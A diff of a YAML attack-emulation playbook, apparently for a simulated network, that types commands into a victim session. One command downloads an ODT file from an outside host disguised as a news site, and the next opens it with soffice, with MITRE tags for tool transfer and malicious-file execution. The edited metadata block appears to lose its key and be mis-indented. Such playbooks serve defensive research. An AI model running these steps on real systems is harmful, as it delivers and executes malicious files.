@@ -134,10 +134,6 @@ commands:
     cmd: type 
     input: "curl -o /home/judy/Nutzungshinweise.odt dailynews-wire.com:8086/index"
     session: client
-    metadata:
-      techniques: "T1105,T1204.002"
-      tactics: "Command and Control, Execution"
-      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
     seconds: 3
@@ -146,6 +142,9 @@ commands:
     cmd: key
     key: "enter"
     session: client
+      techniques: "T1105,T1204.002"
+      tactics: "Command and Control, Execution"
+      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
     seconds: 5
@@ -155,10 +154,6 @@ commands:
     cmd: type 
     input: "soffice /home/judy/Nutzungshinweise.odt"
     session: client
-    metadata:
-      techniques: "T1204.002"
-      tactics: "Execution"
-      technique_name: "User Execution: Malicious File"
 
   - type: sleep
     seconds: 1
